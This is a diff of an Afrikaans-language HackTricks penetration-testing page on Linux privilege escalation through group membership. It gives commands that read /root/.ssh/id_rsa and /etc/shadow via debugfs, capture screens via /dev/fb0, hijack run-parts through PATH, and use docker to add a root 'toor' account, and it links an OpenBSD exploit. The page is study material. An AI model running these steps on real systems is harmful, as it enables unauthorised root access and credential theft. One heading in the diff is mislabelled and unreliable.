@@ -1,18 +1,19 @@
 # Interessante Groepe - Linux Privesc
 
+{% hint style="success" %}
+Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
+{% endhint %}
 
 ## Sudo/Admin Groepe
 
@@ -28,13 +29,13 @@ Ander maniere om HackTricks te ondersteun:
 ```
 Dit beteken dat **enige gebruiker wat behoort tot die groep sudo of admin enigiets as sudo kan uitvoer**.
 
-Indien dit die geval is, kan jy eenvoudig **root word deur die volgende uit te voer**:
+Indien dit die geval is, kan jy **root word deur net uit te voer**:
 ```
 sudo su
 ```
 ### PE - Metode 2
 
-Vind alle suid-binêre lêers en kontroleer of die binêre lêer **Pkexec** daar is:
+Vind alle suid-binêre en kontroleer of daar die binêre **Pkexec** is:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
@@ -55,7 +56,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI aangesluit is nie**. En daar is 'n omweg vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:
+**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie aanlyn is sonder 'n GUI nie**. En daar is 'n manier om hierdie probleem te omseil hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:
 
 {% code title="sessie1" %}
 ```bash
@@ -74,11 +75,11 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 
 ## Wielgroep
 
-**Soms**, **standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
+**Soms**, **standaard** binne die **/etc/sudoers** lê hierdie lyn:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-Dit beteken dat **enige gebruiker wat behoort tot die groep wiel enigiets kan uitvoer as sudo**.
+Dit beteken dat **enige gebruiker wat aan die wielgroep behoort, enigiets as sudo kan uitvoer**.
 
 Indien dit die geval is, kan jy eenvoudig **root word deur uit te voer**:
 ```
@@ -90,11 +91,11 @@ Gebruikers van die **skadugroep** kan die **/etc/shadow** lêer **lees**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-So, lees die lêer en probeer om **sommige hasse te kraak**.
+So, lees die lêer en probeer **sommige hasse kraak**.
 
 ## Personeel Groep
 
-**personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) by te voeg sonder om root-voorregte nodig te hê (let wel dat uitvoerbare lêers in `/usr/local/bin` in die PAD-veranderlike van enige gebruiker is, en hulle mag die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[bron\]](https://wiki.debian.org/SystemGroups)
+**personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) by te voeg sonder om root-voorregte nodig te hê (let wel dat uitvoerbare lêers in `/usr/local/bin` in die PATH-veranderlike van enige gebruiker is, en hulle mag die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[bron\]](https://wiki.debian.org/SystemGroups)
 
 In debian-verspreidings, wys die `$PATH`-veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
 ```bash
@@ -104,9 +105,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-As ons sommige programme in `/usr/local` kan kap, kan ons maklik root kry.
+Indien ons sommige programme in `/usr/local` kan kap, kan ons maklik 'n root kry.
 
-Kaping van die `run-parts` program is 'n maklike manier om root te kry, omdat die meeste programme 'n `run-parts` soos (crontab, wanneer ssh aanmelding) sal hardloop.
+Die kap van die `run-parts` program is 'n maklike manier om 'n root te kry, omdat die meeste programme 'n `run-parts` sal hardloop (soos crontab, wanneer ssh aanmeld).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -159,16 +160,14 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Merk op dat jy ook **lêers kan skryf** met debugfs. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
+Merk op dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Maar, as jy probeer om **lêers wat deur root besit word** te skryf (soos `/etc/shadow` of `/etc/passwd`) sal jy 'n "**Toestemming geweier**" fout kry.
+### Video Groep
 
-## Video Groep
-
-Deur die opdrag `w` te gebruik, kan jy vind **wie op die stelsel ingeteken is** en dit sal 'n uitset soos die volgende een wys:
+Deur die opdrag `w` te gebruik, kan jy **sien wie op die stelsel ingeteken is** en dit sal 'n uitset soos die volgende een wys:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
@@ -176,30 +175,30 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 Die **tty1** beteken dat die gebruiker **yossi fisies ingeteken** is by 'n terminal op die rekenaar.
 
-Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms waarneem. Om dit te doen, moet jy die huidige beeld op die skerm **vasvang in rou data** en die resolusie kry wat die skerm gebruik. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
+Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms waarneem. Om dit te doen, moet jy **die huidige beeld op die skerm vasvang** in rou data en die resolusie kry wat die skerm gebruik. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Om die **rou beeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rou beeld data**:
+Om die **rofbeeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rofbeelddata**:
 
 ![](<../../../.gitbook/assets/image (463).png>)
 
-Verander dan die Breedte en Hoogte na die een wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):
+Verander dan die Breedte en Hoogte na die wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):
 
 ![](<../../../.gitbook/assets/image (317).png>)
 
-## Root Groep
+## Rooigroep
 
-Dit lyk asof standaard **lede van die root groep** toegang kan hê om **sekere dienskonfigurasie-lêers** of sekere **biblioteeklêers** of **ander interessante dinge** te **modifiseer** wat gebruik kan word om voorregte te eskaleer...
+Dit lyk asof standaard **lede van die rooigroep** toegang kan hê om **sekere dienskonfigurasie-lêers** of **sekere biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te eskaleer...
 
-**Kyk watter lêers root-lede kan modifiseer**:
+**Kyk watter lêers rooigroeplede kan wysig**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
 ## Docker Groep
 
-Jy kan die **wortel-lêerstelsel van die gasrekenaar aan 'n instansie se volume koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief worteltoegang tot die rekenaar.
+Jy kan die hooflêersisteem van die gasrekenaar aan 'n instansie se volume **koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief beheer oor die rekenaar.
 ```bash
 docker image #Get images from the docker service
 
@@ -211,12 +210,12 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-## Adm Groep
+### LXC/LXD Groep
 
 Gewoonlik het **lede** van die groep **`adm`** toestemmings om **log** lêers binne _/var/log/_ te **lees**.\
-Daarom, as jy 'n gebruiker binne hierdie groep gekompromitteer het, moet jy beslis na die **logs kyk**.
+Daarom, as jy 'n gebruiker binne hierdie groep gekompromiteer het, moet jy beslis na die **logs kyk**.
 
-## Auth groep
+### Auth groep
 
 Binne OpenBSD kan die **auth** groep gewoonlik skryfregte hê in die _**/etc/skey**_ en _**/var/db/yubikey**_ as hulle gebruik word.\
-Hierdie regte kan misbruik word met die volgende uitbuiting om te **privilege te eskaleer** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Hierdie regte kan misbruik word met die volgende uitbuiting om **privileges te eskaleer** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
